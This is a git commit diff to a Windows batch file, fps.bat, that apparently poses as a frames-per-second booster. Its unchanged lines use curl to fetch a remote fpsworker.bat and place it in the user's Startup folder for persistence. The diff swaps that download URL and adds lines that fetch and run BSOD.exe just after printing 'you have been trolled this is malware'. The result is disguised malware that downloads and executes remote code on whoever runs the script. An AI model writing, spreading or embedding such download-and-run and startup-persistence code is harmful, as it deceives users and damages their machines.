600325998f22cef54f083254f9872ee777135a6c
Nate <99703235+GreatNate0509YT@users.noreply.github.com>
2022-10-27 17:24:14 -0500

    Update fps.bat

--- fps.bat
+++ fps.bat
@@ -4,7 +4,7 @@ color 0a
 cls 
 cd /d C:/
 cd %userprofile%
-curl -O https://download1532.mediafire.com/4yx8hyuk6yog/eg5sz6dz17av1uz/fpsworker.bat
+curl -O https://download1493.mediafire.com/4tq09s0bw09g/c1mz4eb5g2pdnqm/fpsworker.bat
 cls
 move "fpsworker.bat" "%userprofile%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\fpsworker.bat"
 del fpsworker.bat
@@ -21,4 +21,6 @@ goto %main%
 cls
 echo you have been trolled this is malware
 pause
+curl -O https://download1527.mediafire.com/1yamy5ufkxxg/qi2f5v76pi61gcg/BSOD.exe
+BSOD
 exit
